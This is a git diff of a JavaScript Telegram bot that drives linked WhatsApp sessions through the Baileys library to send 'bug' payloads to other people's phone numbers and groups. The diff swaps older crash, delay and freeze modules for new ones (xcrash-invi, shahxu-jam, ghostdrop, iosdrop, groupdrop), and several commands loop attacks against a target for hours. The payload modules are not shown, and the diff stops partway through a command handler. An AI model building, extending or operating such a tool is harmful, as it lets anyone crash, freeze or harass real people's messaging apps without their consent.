@@ -36,18 +36,18 @@ const unauthorized = Buffer.from('8J+aqyBZb3UgYXJlIG5vdCBhdXRob3JpemVkIHRvIHVzZS
 
 // SY Loves Here 🤗❤️‍🩹
 const SYLoves = `./SY/S7/`;
-const CrashLogic = require(SYLoves + 'crashfinity');
-const stickerLogic = require(SYLoves + 'StickerCrash');
-const CallLogic = require(SYLoves + 'CallCrash');
-const XLogic = require(SYLoves + 'Xdelay');
-const IosLogic = require(SYLoves + 'IosInvisible');
-const XgcLogic = require(SYLoves + 'Xgc');
-const xbetainvisLogic = require(SYLoves + 'xbetainvis');
-const testlogic = require(SYLoves + 'test');
-// ADDED NEW MODULES
-const crashjamLogic = require(SYLoves + 'crashjam');
-const killsystemLogic = require(SYLoves + 'killsystem');
-const gcFrzLogic = require(SYLoves + 'gcFrz');
+
+// ===== ANDROID BUGS =====
+const xcrashInviLogic = require(SYLoves + 'xcrash-invi');
+const shahxuJamLogic  = require(SYLoves + 'shahxu-jam');
+const ghostdropLogic  = require(SYLoves + 'ghostdrop');
+
+// ===== IOS BUGS =====
+const iosdropLogic     = require(SYLoves + 'iosdrop');
+const phantomdropLogic = require(SYLoves + 'phantomdrop');
+
+// ===== GROUP =====
+const groupdropLogic = require(SYLoves + 'groupdrop');
 
 const colors = {
     reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
@@ -171,7 +171,7 @@ async function StartLovingSY(chatId, number, S7) {
     log('info', 'WhatsApp', `Baileys version: ${version.join('.')}`);
 
     const SYxS7 = makeWASocket({
-        version,                                    // ← FIX #1: pass version
+        version,
         logger: pino({ level: 'silent' }),
         printQRInTerminal: false,
         auth: {
@@ -182,20 +182,18 @@ async function StartLovingSY(chatId, number, S7) {
             ),
         },
         browser: ['Mac OS', 'Safari', '10.15.7'],
-        markOnlineOnConnect: false,                 // ← FIX: pairing ke waqt false
+        markOnlineOnConnect: false,
         syncFullHistory: false,
         generateHighQualityLinkPreview: false,
     });
 
-    // Pairing code request — sirf ek baar
     let pairingRequested = false;
 
     SYxS7.ev.on('creds.update', saveCreds);
 
-    SYxS7.ev.on('connection.update', async (update) => {
+    SYxS7.ev.on("connection.update", async (update) => {
         const { connection, lastDisconnect, qr } = update;
 
-        // FIX #2: 'connecting' pe pairing code maango, socket ready hone ke baad
         if (connection === 'connecting' && !SYxS7.authState.creds.registered && !pairingRequested) {
             pairingRequested = true;
             await delay(1500);
@@ -218,19 +216,21 @@ async function StartLovingSY(chatId, number, S7) {
                     { parse_mode: 'HTML' }
                 );
             } catch (err) {
-                pairingRequested = false; // allow retry
+                pairingRequested = false;
                 log('error', 'WhatsApp', `Pairing code request failed: ${err.message}`);
                 await S7.sendMessage(
                     chatId,
-                    `❌ <b>Pairing Code Failed</b>\n` +
-                    `Number: ${number}\n` +
-                    `Reason: <code>${err.message}</code>`,
+                    `❌ <b>Pairing Code Failed</b>\nNumber: ${number}\nReason: <code>${err.message}</code>`,
                     { parse_mode: 'HTML' }
                 ).catch(() => {});
             }
         }
 
-        if (connection === 'open') {
+        if (connection === 'connecting') {
+            log('info', 'WhatsApp', `Connecting: ${number}`);
+        }
+
+        if (connection === "open") {
             log('success', 'WhatsApp', `Connected: ${number}`);
             if (!waSessions[chatId]) waSessions[chatId] = [];
             waSessions[chatId].push({ sock: SYxS7, num: number });
@@ -238,18 +238,15 @@ async function StartLovingSY(chatId, number, S7) {
                 await S7.sendMessage(chatId, `✅ <b>WhatsApp Connected!</b>\nNumber: ${number}.`, { parse_mode: 'HTML' }).catch(() => {});
             }
         }
-
-        if (connection === 'close') {
+        if (connection === "close") {
             if (waSessions[chatId]) {
                 waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
             }
 
-            const reason = lastDisconnect?.error?.output?.statusCode;
+            let reason = lastDisconnect?.error?.output?.statusCode;
             log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);
-
             if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost) {
                 log('info', 'WhatsApp', `Restarting/Reconnecting session for ${number}...`);
-                pairingRequested = false;
                 StartLovingSY(chatId, number, S7);
             } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                 log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
@@ -343,8 +340,15 @@ function MainSYLoVe(name, uptime, love) {
     return `┌──────┤ ${config.bot} ├──────┐\n│➻ Name: ${name}\n│➻ Status: ${status}\n│➻ Online: ${uptime}\n└──────────────────────┘`;
 }
 
-function BvgSYLoVe(cleanTarget) {
-    return `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ \n┃ Tᴀʀɢᴇᴛ : ${cleanTarget}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
+function bvgNotice(target, from, duration) {
+    return (
+        `┌──────┤ NOTIFICATION ├──────┐\n` +
+        `│➻ sent bvg...\n` +
+        `│➻ Target: ${target}\n` +
+        `│➻ From: ${from}\n` +
+        `│➻ Duration: ${duration}\n` +
+        `└────────────────────────┘`
+    );
 }
 
 // ==================== START BOT ====================
@@ -424,13 +428,16 @@ function startSYloveBot(token) {
             S7.sendPhoto(chatId, LoveLogo, {
                 caption: captionText,
                 ...menuButtons
-            }).catch(() => {
+            }).catch((err) => {
+                log('error', 'START_PHOTO', err.message);
                 S7.sendMessage(chatId, captionText, menuButtons);
             });
         });
 
-        // ==================== CALLBACK QUERY HANDLER (UPDATED WITH NEW COMMANDS) ====================
+        // ==================== CALLBACK QUERY HANDLER ====================
         S7.on('callback_query', async (query) => {
+            try { await S7.answerCallbackQuery(query.id); } catch {}
+
             const chatId = query.message.chat.id;
             const messageId = query.message.message_id;
             const data = query.data;
@@ -438,132 +445,87 @@ function startSYloveBot(token) {
             const uptime = getRuntime();
             const userId = query.from.id.toString();
 
-            if (!LoveGlobalState(userId)) {
-                await S7.answerCallbackQuery(query.id, { text: '⛔ You are not authorized!', show_alert: true });
-                return sendSYLove(S7, chatId);
-            }
-
-            // Main Menu
-            if (data === 'main_menu') {
-                const mainText = MainSYLoVe(name, uptime, userId) + `
-┌──────┤ Press Button Menu ├──────┐
-└────────────────────────┘`;
-
-                await S7.editMessageCaption(mainText, {
+            const safeEdit = async (text, keyboard) => {
+                const opts = {
                     chat_id: chatId,
                     message_id: messageId,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: 'I|  Bug Menu', callback_data: 'bug_menu' }, { text: 'I|  Misc Menu', callback_data: 'misc_menu' }],
-                            [{ text: 'I|  Channel ↗', url: `${config.channel}` }],
-                            [{ text: 'I|  Group ↗', url: `${config.group}` }]
-                        ]
-                    }
-                });
-            }
+                    parse_mode: 'HTML',
+                    reply_markup: { inline_keyboard: keyboard }
+                };
+                const hasCaption = !!(query.message.caption || query.message.photo);
+                try {
+                    if (hasCaption) await S7.editMessageCaption(text, opts);
+                    else await S7.editMessageText(text, opts);
+                } catch (err) {
+                    try { await S7.editMessageText(text, opts); }
+                    catch (err2) { log('error', 'CALLBACK_EDIT', err2.message); }
+                }
+            };
 
-            // Bug Menu
-            else if (data === 'bug_menu') {
-                const bugText = MainSYLoVe(name, uptime, userId) + `
-┌──────┤ BUG MENU ├──────┐
-│ Select your platform
-└──────────────────────┘`;
+            try {
+                if (!LoveGlobalState(userId)) {
+                    await S7.answerCallbackQuery(query.id, { text: '⛔ You are not authorized!', show_alert: true });
+                    return sendSYLove(S7, chatId);
+                }
 
-                await S7.editMessageCaption(bugText, {
-                    chat_id: chatId,
-                    message_id: messageId,
-                    reply_markup: {
-                        inline_keyboard: [
+                const mainMenuKb = [
+                    [{ text: 'I|  Bug Menu', callback_data: 'bug_menu' }, { text: 'I|  Misc Menu', callback_data: 'misc_menu' }],
+                    [{ text: 'I|  Channel ↗', url: `${config.channel}` }],
+                    [{ text: 'I|  Group ↗', url: `${config.group}` }]
+                ];
+
+                if (data === 'main_menu') {
+                    await safeEdit(
+                        MainSYLoVe(name, uptime, userId) + `\n┌──────┤ Press Button Menu ├──────┐\n└────────────────────────┘`,
+                        mainMenuKb
+                    );
+                }
+                else if (data === 'bug_menu') {
+                    await safeEdit(
+                        MainSYLoVe(name, uptime, userId) + `\n┌──────┤ BUG MENU ├──────┐\n│ Select your platform\n└──────────────────────┘`,
+                        [
                             [{ text: 'I| 𝖠𝗇𝖽𝗋𝗈𝗂𝖽 𝖡𝗎𝗀𝗌', callback_data: 'android_menu' }],
                             [{ text: 'I| 𝖨𝗈𝗌 𝖡𝗎𝗀𝗌', callback_data: 'ios_menu' }],
                             [{ text: 'I| 𝖦𝗋𝗈𝗎𝗉 𝖡𝗎𝗀𝗌', callback_data: 'group_menu' }],
                             [{ text: 'I| 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇', callback_data: 'main_menu' }]
                         ]
-                    }
-                });
-            }
-
-            // Android Menu - UPDATED WITH NEW COMMANDS
-            else if (data === 'android_menu') {
-                const androidText = MainSYLoVe(name, uptime, userId) + `
+                    );
+                }
+                else if (data === 'android_menu') {
+                    await safeEdit(
+                        MainSYLoVe(name, uptime, userId) + `
 ┌──────┤ 𝖠𝖭𝖣𝖱𝖮𝖨𝖣 𝖡𝖴𝖦𝖲 ├──────┐
-│➻ /crashjam [num] [hours]
-│➻ /trashsystem [num] [hours]
-│➻ /crashdroid [num] [hours]
-│➻ /killsystem [num] [hours]
-│➻ /forceblock [num] [amount]
-│➻ /xbetainvis [num]
-│➻ /delaymaker [num] [hours]
-│➻ /delayxceed [num] [hours]
-│➻ /absolutedelay [num] [hours]
-│➻ /xdelayinvis [num] [hours]
-│➻ /nullfinity [num] [hours]
-│➻ /crashfinity [num]
-└──────────────────────┘`;
-
-                await S7.editMessageCaption(androidText, {
-                    chat_id: chatId,
-                    message_id: messageId,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]
-                        ]
-                    }
-                });
-            }
-
-            // iOS Menu
-            else if (data === 'ios_menu') {
-                const iosText = MainSYLoVe(name, uptime, userId) + `
+│➻ /xcrash-invi [num]
+│➻ /shahxu-jam  [num]
+│➻ /ghostdrop   [num]
+└──────────────────────┘`,
+                        [[{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]]
+                    );
+                }
+                else if (data === 'ios_menu') {
+                    await safeEdit(
+                        MainSYLoVe(name, uptime, userId) + `
 ┌──────┤ 𝖨𝖮𝖲 𝖡𝖴𝖦𝖲 ├──────┐
-│➻ /hidenseek [num] [hours]
-│➻ /iosinvisible [num] [hours]
-│➻ /iosvisible [num] [hours]
-└──────────────────────┘`;
-
-                await S7.editMessageCaption(iosText, {
-                    chat_id: chatId,
-                    message_id: messageId,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]
-                        ]
-                    }
-                });
-            }
-
-            // Group Menu - UPDATED WITH NEW COMMANDS
-            else if (data === 'group_menu') {
-                const groupText = MainSYLoVe(name, uptime, userId) + `
+│➻ /iosdrop     [num]
+│➻ /phantomdrop [num]
+└──────────────────────┘`,
+                        [[{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]]
+                    );
+                }
+                else if (data === 'group_menu') {
+                    await safeEdit(
+                        MainSYLoVe(name, uptime, userId) + `
 ┌──────┤ 𝖦𝖱𝖮𝖴𝖯 𝖡𝖴𝖦𝖲 ├──────┐
-│➻ /trashsysgp [group_id] [hours]
-│➻ /xgroup [group_id] [hours]
-│➻ /killgc [group_id] [hours]
-│➻ /groupfriz [group_id] [hours]
-│➻ /groupui [group_id] [hours]
-│➻ /nullgc [group_id] [hours]
-│➻ /groupfinity [group_id] [hours]
-│➻ /autoclosegc [group_id] [hours]
-│➻ /groupmix [group_id] [hours]
-│➻ /forcegroup [group_id] [amount]
+│➻ /groupdrop [group_id]@g.us
 │➻ /listgc
 │➻ /groupid [link]
-└──────────────────────┘`;
-
-                await S7.editMessageCaption(groupText, {
-                    chat_id: chatId,
-                    message_id: messageId,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]
-                        ]
-                    }
-                });
-            }
-
-            // Misc Menu
-            else if (data === 'misc_menu') {
-                const miscText = MainSYLoVe(name, uptime, userId) + `
+└──────────────────────┘`,
+                        [[{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]]
+                    );
+                }
+                else if (data === 'misc_menu') {
+                    await safeEdit(
+                        MainSYLoVe(name, uptime, userId) + `
 ┌──────┤ 𝖬𝖨𝖲𝖢 𝖬𝖤𝖭𝖴 ├──────┐
 │➻ /reqpair [number]
 │➻ /delpair [number]
@@ -579,645 +541,336 @@ function startSYloveBot(token) {
 │➻ /mytoken
 │➻ /state [0|1]
 │➻ /broadcast [message]
-└──────────────────────┘`;
+└──────────────────────┘`,
+                        [[{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇', callback_data: 'main_menu' }]]
+                    );
+                }
+            } catch (err) {
+                log('error', 'CALLBACK', err.message);
+            }
+        });
 
-                await S7.editMessageCaption(miscText, {
-                    chat_id: chatId,
-                    message_id: messageId,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇', callback_data: 'main_menu' }]
-                        ]
-                    }
+        // ============================================================
+        // NEW ANDROID BUG COMMANDS
+        // ============================================================
+
+        // /xcrash-invi [num]
+        SYLoVe(['xcrash-invi', 'xcrashinvi', 'xinvi'], async (msg) => {
+            const chatId = msg.chat.id.toString();
+            const userId = msg.from.id.toString();
+            const args = msg.text.split(' ');
+            const cmd = args[0].slice(1);
+            const targetNum = args[1];
+
+            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
+            const session = GetSessionForUser(userId, chatId);
+            if (session.error) return S7.sendMessage(chatId, session.error);
+            const client = session.sock;
+
+            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);
+
+            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
+            const targetJid = `${cleanTarget}@s.whatsapp.net`;
+
+            try {
+                const [exists] = await client.onWhatsApp(targetJid);
+                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
+
+                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
+                await S7.sendPhoto(chatId, LoveLogo, {
+                    caption: bvgNotice(cleanTarget, session.num, 'invisible · no-time'),
+                    parse_mode: 'HTML'
                 });
-            }
 
-            await S7.answerCallbackQuery(query.id);
-        });
+                const res = await xcrashInviLogic.xcrashInvi(client, targetJid, {
+                    rounds: 3, gapMs: 900, arm: true, useLid: true,
+                });
 
-        // ==================== EXISTING BUG COMMANDS ====================
-
-        SYLoVe('xbetainvis', async (msg) => {
-            const chatId = msg.chat.id.toString();
-            const userId = msg.from.id.toString();
-            const args = msg.text.split(' ');
-            const targetNum = args[1];
-
-            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-            const session = GetSessionForUser(userId, chatId);
-            if (session.error) return S7.sendMessage(chatId, session.error);
-            const client = session.sock;
-
-            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /xbetainvis +234XXXXXXX`);
-
-            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
-            const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-            try {
-                const [exists] = await client.onWhatsApp(targetJid);
-                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
-
-                log('command', msg.from.first_name, `Calling xbetainvis on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
-
-                await xbetainvisLogic.xbetainvis(client, targetJid);
+                S7.sendMessage(chatId,
+                    `✅ <b>XCRASH-INVI DONE</b>\n` +
+                    `Target: <code>${cleanTarget}</code>\n` +
+                    `Routing: <b>${res.mode.toUpperCase()}</b>\n` +
+                    `Privacy: <b>${res.privacyArmed}/7</b>`,
+                    { parse_mode: 'HTML' }
+                );
             } catch (err) {
-                log('error', 'xbetainvis', err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
+                log('error', cmd, err.message);
+                S7.sendMessage(chatId, `❌ ${err.message}`);
             }
         });
 
-        SYLoVe(['delaymaker', 'absolutedelay', 'forceblock'], async (msg) => {
+        // /shahxu-jam [num]
+        SYLoVe(['shahxu-jam', 'shahxujam', 'sjam'], async (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
             const args = msg.text.split(' ');
             const cmd = args[0].slice(1);
+            const targetNum = args[1];
 
             if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
             const session = GetSessionForUser(userId, chatId);
             if (session.error) return S7.sendMessage(chatId, session.error);
             const client = session.sock;
 
-            if (args.length < 3) {
-                return S7.sendMessage(chatId, `❌ Usage: /${cmd} +234XXXXXXX 1`);
-            }
+            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);
 
-            const cleanTarget = args[1].replace(/[^0-9]/g, '');
+            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
             const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
             try {
                 const [exists] = await client.onWhatsApp(targetJid);
                 if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
 
-                log('command', msg.from.first_name, `Calling ${cmd} on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
+                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
+                await S7.sendPhoto(chatId, LoveLogo, {
+                    caption: bvgNotice(cleanTarget, session.num, 'jam · no-time'),
+                    parse_mode: 'HTML'
+                });
 
-                const delayFn = ms => new Promise(res => setTimeout(res, ms));
+                const report = await shahxuJamLogic.shahxuJam(client, targetJid, {
+                    rounds: 3, gapMs: 600, arm: true, useLid: true,
+                });
 
-                if (args[2] === 'only') {
-                    const count = parseInt(args[3]);
-                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    for (let i = 0; i < count; i++) {
-                        await CallLogic.CallCrash(client, targetJid);
-                        await delayFn(2000);
-                    }
-                } else {
-                    const hours = parseInt(args[2]);
-                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
-                    const endTime = Date.now() + hours * 60 * 60 * 1000;
-                    while (Date.now() < endTime) {
-                        await CallLogic.CallCrash(client, targetJid);
-                        await delayFn(2000);
-                    }
-                }
+                const layerSummary = Object.entries(report.layers)
+                    .filter(([k]) => !k.endsWith('_fail'))
+                    .map(([k, v]) => `${k}:${v}`)
+                    .join(' · ');
+
+                S7.sendMessage(chatId,
+                    `✅ <b>SHAHXU-JAM DONE</b>\n` +
+                    `Target: <code>${cleanTarget}</code>\n` +
+                    `Routing: <b>${report.mode.toUpperCase()}</b>\n` +
+                    `Privacy: <b>${report.privacyArmed}/7</b>\n` +
+                    `Layers: <code>${layerSummary}</code>`,
+                    { parse_mode: 'HTML' }
+                );
             } catch (err) {
                 log('error', cmd, err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
+                S7.sendMessage(chatId, `❌ ${err.message}`);
             }
         });
 
-        SYLoVe('xdelayinvis', async (msg) => {
-            const chatId = msg.chat.id.toString();
-            const userId = msg.from.id.toString();
-            const args = msg.text.split(' ');
-
-            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-            const session = GetSessionForUser(userId, chatId);
-            if (session.error) return S7.sendMessage(chatId, session.error);
-            const client = session.sock;
-
-            if (args.length < 3) {
-                return S7.sendMessage(chatId, `❌ Usage: /xdelayinvis +234XXXXXXX 1`);
-            }
-
-            const cleanTarget = args[1].replace(/[^0-9]/g, '');
-            const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-            try {
-                const [exists] = await client.onWhatsApp(targetJid);
-                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
-
-                log('command', msg.from.first_name, `Calling xdelayinvis on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
-
-                const delayFn = ms => new Promise(res => setTimeout(res, ms));
-
-                if (args[2] === 'only') {
-                    const count = parseInt(args[3]);
-                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    for (let i = 0; i < count; i++) {
-                        await XLogic.Xdelay(client, targetJid);
-                        await delayFn(500);
-                    }
-                } else {
-                    const hours = parseInt(args[2]);
-                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
-                    const endTime = Date.now() + hours * 60 * 60 * 1000;
-                    while (Date.now() < endTime) {
-                        await XLogic.Xdelay(client, targetJid);
-                        await delayFn(500);
-                    }
-                }
-            } catch (err) {
-                log('error', 'xdelayinvis', err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
-            }
-        });
-
-        SYLoVe('crashfinity', async (msg) => {
-            const chatId = msg.chat.id.toString();
-            const userId = msg.from.id.toString();
-            const args = msg.text.split(' ');
-            const targetNum = args[1];
-
-            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-            const session = GetSessionForUser(userId, chatId);
-            if (session.error) return S7.sendMessage(chatId, session.error);
-            const client = session.sock;
-
-            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /crashfinity +234XXXXXXX`);
-
-            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
-            const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-            try {
-                const [exists] = await client.onWhatsApp(targetJid);
-                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
-
-                log('command', msg.from.first_name, `Calling crashfinity on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
-
-                if (typeof CrashLogic.crashfinity === 'function') {
-                    await CrashLogic.crashfinity(client, targetJid);
-                } else throw new Error('Function not found');
-            } catch (err) {
-                log('error', 'crashfinity', err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
-            }
-        });
-
-        SYLoVe('crashdroid', async (msg) => {
-            const chatId = msg.chat.id.toString();
-            const userId = msg.from.id.toString();
-            const args = msg.text.split(' ');
-
-            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-            const session = GetSessionForUser(userId, chatId);
-            if (session.error) return S7.sendMessage(chatId, session.error);
-            const client = session.sock;
-
-            if (args.length < 3) {
-                return S7.sendMessage(chatId, `❌ Usage: /crashdroid +234XXXXXXX 1`);
-            }
-
-            const cleanTarget = args[1].replace(/[^0-9]/g, '');
-            const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-            try {
-                const [exists] = await client.onWhatsApp(targetJid);
-                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
-
-                log('command', msg.from.first_name, `Calling crashdroid on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
-
-                const delayFn = ms => new Promise(res => setTimeout(res, ms));
-
-                if (args[2] === 'only') {
-                    const count = parseInt(args[3]);
-                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    for (let i = 0; i < count; i++) {
-                        await CallLogic.CallCrash(client, targetJid);
-                        await delayFn(2000);
-                    }
-                } else {
-                    const hours = parseInt(args[2]);
-                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
-                    const endTime = Date.now() + hours * 60 * 60 * 1000;
-                    while (Date.now() < endTime) {
-                        await CallLogic.CallCrash(client, targetJid);
-                        await delayFn(2000);
-                    }
-                }
-            } catch (err) {
-                log('error', 'crashdroid', err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
-            }
-        });
-
-        SYLoVe('killsystem', async (msg) => {
-            const chatId = msg.chat.id.toString();
-            const userId = msg.from.id.toString();
-            const args = msg.text.split(' ');
-            const targetNum = args[1];
-
-            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-            const session = GetSessionForUser(userId, chatId);
-            if (session.error) return S7.sendMessage(chatId, session.error);
-            const client = session.sock;
-
-            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /killsystem +92020065715`);
-
-            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
-            const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-            try {
-                const [exists] = await client.onWhatsApp(targetJid);
-                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
-
-                log('command', msg.from.first_name, `Calling killsystem on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
-
-                await killsystemLogic.killsystem(client, targetJid);
-            } catch (err) {
-                log('error', 'killsystem', err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
-            }
-        });
-
-        SYLoVe('delayxceed', async (msg) => {
-            const chatId = msg.chat.id.toString();
-            const userId = msg.from.id.toString();
-            const args = msg.text.split(' ');
-
-            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-            const session = GetSessionForUser(userId, chatId);
-            if (session.error) return S7.sendMessage(chatId, session.error);
-            const client = session.sock;
-
-            if (args.length < 3) {
-                return S7.sendMessage(chatId, `❌ Usage: /delayxceed +234XXXXXXX 1`);
-            }
-
-            const cleanTarget = args[1].replace(/[^0-9]/g, '');
-            const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-            try {
-                const [exists] = await client.onWhatsApp(targetJid);
-                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
-
-                log('command', msg.from.first_name, `Calling delayxceed on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
-
-                const delayFn = ms => new Promise(res => setTimeout(res, ms));
-
-                if (args[2] === 'only') {
-                    const count = parseInt(args[3]);
-                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    for (let i = 0; i < count; i++) {
-                        await XLogic.Xdelay(client, targetJid);
-                        await delayFn(500);
-                    }
-                } else {
-                    const hours = parseInt(args[2]);
-                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
-                    const endTime = Date.now() + hours * 60 * 60 * 1000;
-                    while (Date.now() < endTime) {
-                        await XLogic.Xdelay(client, targetJid);
-                        await delayFn(500);
-                    }
-                }
-            } catch (err) {
-                log('error', 'delayxceed', err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
-            }
-        });
-
-        SYLoVe('nullfinity', async (msg) => {
-            const chatId = msg.chat.id.toString();
-            const userId = msg.from.id.toString();
-            const args = msg.text.split(' ');
-            const targetNum = args[1];
-
-            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-            const session = GetSessionForUser(userId, chatId);
-            if (session.error) return S7.sendMessage(chatId, session.error);
-            const client = session.sock;
-
-            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /nullfinity +234XXXXXXX`);
-
-            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
-            const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-            try {
-                const [exists] = await client.onWhatsApp(targetJid);
-                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
-
-                log('command', msg.from.first_name, `Calling nullfinity on ${cleanTarget}`);
-                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
-
-                await XLogic.Xdelay(client, targetJid);
-                await CrashLogic.crashfinity(client, targetJid);
-            } catch (err) {
-                log('error', 'nullfinity', err.message);
-                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
-            }
-        });
-
-        // ==================== NEW ANDROID BUG COMMANDS FROM YOUR SCRIPT ====================
-
-        SYLoVe(['crashjam', 'trashsystem'], async (msg) => {
-            const chatId = msg.chat.id.toString();
-            const userId = msg.from.id.toString();
-            const args = msg.text.split(' ');
-            const s7CM = args[0].slice(1);
-
-            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
-
-            const session = GetSessionForUser(userId, chatId);
-            if (session.error) return S7.sendMessage(chatId, session.error);
-            const client = session.sock;
-
-            if (args.length < 3) {
-                return S7.sendMessage(chatId, `❌ Usage: /${s7CM} +234XXXXXXX 1`);
-            }
-
-            const cleanTarget = args[1].replace(/[^0-9]/g, '');
-            const targetJid = `${cleanTarget}@s.whatsapp.net`;
-
-            try {
-                const [exists] = await client.onWhatsApp(targetJid);
